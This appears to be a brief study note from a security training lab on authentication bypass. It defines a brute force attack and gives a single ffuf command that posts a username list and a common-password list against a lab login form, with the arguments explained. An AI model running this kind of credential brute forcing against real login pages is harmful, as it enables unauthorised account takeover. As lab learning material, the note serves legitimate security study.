___
- tags: #authentication_bypass #ffuf #brute_force
___
A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.


## Brute force FFUF
```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.201.78.121/customers/login -fc 200
```

### Arguments
- W1 -> valid usernames
- W2 -> list of passwords
- -fc -> check status code

